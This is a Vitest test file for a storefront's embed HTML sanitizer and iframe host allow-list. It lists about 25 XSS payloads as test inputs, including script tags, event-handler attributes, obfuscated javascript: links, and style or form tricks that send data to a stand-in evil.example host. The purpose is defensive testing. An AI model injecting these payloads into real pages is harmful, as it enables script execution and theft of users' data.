import { describe, expect, it } from 'vitest'
import {
  EMBED_MAX_LENGTH,
  EMBED_SANDBOX,
  isAllowedEmbedSrc,
  sanitizeEmbedHtml,
} from '../src/embed-sanitize'

describe('sanitizeEmbedHtml: XSS vectors', () => {
  const vectors: [string, string][] = [
    ['script tag', '<p>hi</p><script>alert(1)</script>'],
    ['script with src', '<script src="https://evil.example/x.js"></script>'],
    ['img onerror', '<img src="https://cdn.example/a.jpg" onerror="alert(1)">'],
    ['svg onload', '<svg onload="alert(1)"><circle r="4"/></svg>'],
    [
      'svg foreignObject script',
      '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    ],
    ['javascript: href', '<a href="javascript:alert(1)">x</a>'],
    ['javascript: href with entities', '<a href="jav&#x09;ascript:alert(1)">x</a>'],
    ['mixed-case javascript', '<a href="JaVaScRiPt:alert(1)">x</a>'],
    ['data: image', '<img src="data:image/svg+xml;base64,PHN2Zy8+">'],
    ['vbscript', '<a href="vbscript:msgbox(1)">x</a>'],
    ['style attribute', '<p style="background:url(https://evil.example/leak?c=1)">x</p>'],
    ['style tag', '<style>@import url(https://evil.example/x.css)</style><p>x</p>'],
    ['form and input', '<form action="https://evil.example"><input name="card"></form>'],
    ['object and embed', '<object data="x.swf"></object><embed src="x.swf">'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
    ['base tag', '<base href="https://evil.example/">'],
    ['link stylesheet', '<link rel="stylesheet" href="https://evil.example/x.css">'],
    ['iframe from an unknown host', '<iframe src="https://evil.example/embed/abc"></iframe>'],
    ['iframe with javascript src', '<iframe src="javascript:alert(1)"></iframe>'],
    ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
    ['protocol-relative image', '<img src="//evil.example/pixel.gif">'],
    ['onclick on a div', '<div onclick="alert(1)">x</div>'],
    ['id clobbering', '<img id="location" src="https://cdn.example/a.jpg">'],
    ['template smuggling', '<template><script>alert(1)</script></template>'],
    ['details ontoggle', '<details open ontoggle="alert(1)"><summary>x</summary></details>'],
  ]

  it.each(vectors)('strips %s', (_name, input) => {
    const out = sanitizeEmbedHtml(input).toLowerCase()
    expect(out).not.toContain('<script')
    expect(out).not.toMatch(/\son[a-z]+\s*=/)
    expect(out).not.toContain('javascript:')
    expect(out).not.toContain('vbscript:')
    expect(out).not.toContain('data:')
    expect(out).not.toContain('style')
    expect(out).not.toContain('<svg')
    expect(out).not.toContain('<form')
    expect(out).not.toContain('<object')
    expect(out).not.toContain('<embed')
    expect(out).not.toContain('<meta')
    expect(out).not.toContain('<base')
    expect(out).not.toContain('<link')
    expect(out).not.toContain('evil.example')
    expect(out).not.toContain('srcdoc')
    expect(out).not.toContain(' id=')
  })

  it('keeps ordinary formatting, links and images', () => {
    const html =
      '<h2>Care</h2><p><strong>Hand wash</strong> only. <a href="/pages/care">More</a></p><img src="https://cdn.example/a.jpg" alt="Label">'
    const out = sanitizeEmbedHtml(html)
    expect(out).toContain('<h2>Care</h2>')
    expect(out).toContain('<strong>Hand wash</strong>')
    expect(out).toContain('href="/pages/care"')
    expect(out).toContain('src="https://cdn.example/a.jpg"')
    expect(out).toContain('alt="Label"')
  })

  it('adds rel to links that open a new tab and drops other targets', () => {
    expect(sanitizeEmbedHtml('<a href="https://a.example" target="_blank">a</a>')).toContain(
      'rel="noopener noreferrer"',
    )
    expect(sanitizeEmbedHtml('<a href="https://a.example" target="_top">a</a>')).not.toContain(
      'target',
    )
  })

  it('sandboxes allowed embeds and replaces any sandbox the merchant wrote', () => {
    const out = sanitizeEmbedHtml(
      '<iframe src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ" sandbox="allow-top-navigation" title="Film"></iframe>',
    )
    expect(out).toContain('src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"')
    expect(out).toContain(`sandbox="${EMBED_SANDBOX}"`)
    expect(out).not.toContain('allow-top-navigation')
    expect(out).toContain('loading="lazy"')
    expect(out).toContain('title="Film"')
  })

  it('caps the input length', () => {
    const out = sanitizeEmbedHtml(`<p>${'a'.repeat(EMBED_MAX_LENGTH * 2)}</p>`)
    expect(out.length).toBeLessThanOrEqual(EMBED_MAX_LENGTH + 10)
  })

  it('is idempotent', () => {
    const once = sanitizeEmbedHtml(
      '<p onclick="x">a<iframe src="https://player.vimeo.com/video/1"></iframe></p>',
    )
    expect(sanitizeEmbedHtml(once)).toBe(once)
  })

  it('returns an empty string for anything that is not HTML text', () => {
    expect(sanitizeEmbedHtml(undefined)).toBe('')
    expect(sanitizeEmbedHtml({ html: '<p>x</p>' })).toBe('')
  })
})

describe('isAllowedEmbedSrc', () => {
  it.each([
    ['https://www.youtube.com/embed/dQw4w9WgXcQ', true],
    ['https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ', true],
    ['https://player.vimeo.com/video/76979871', true],
    ['https://www.instagram.com/p/CxYz123abc/embed', true],
    ['http://www.youtube.com/embed/dQw4w9WgXcQ', false],
    ['https://www.youtube.com/watch?v=dQw4w9WgXcQ', false],
    ['https://www.youtube.com.evil.example/embed/dQw4w9WgXcQ', false],
    ['https://user@www.youtube.com/embed/dQw4w9WgXcQ', false],
    ['https://www.youtube.com:8443/embed/dQw4w9WgXcQ', false],
    ['not a url', false],
  ])('%s → %s', (src, ok) => {
    expect(isAllowedEmbedSrc(src)).toBe(ok)
  })
})

describe('sanitizeEmbedHtml: no class names', () => {
  it('drops class so storefront utilities cannot position pasted HTML', () => {
    expect(sanitizeEmbedHtml('<div class="fixed inset-0 z-50">x</div>')).toBe('<div>x</div>')
    expect(sanitizeEmbedHtml('<a class="fixed inset-0" href="/x">y</a>')).not.toContain('class')
  })
})
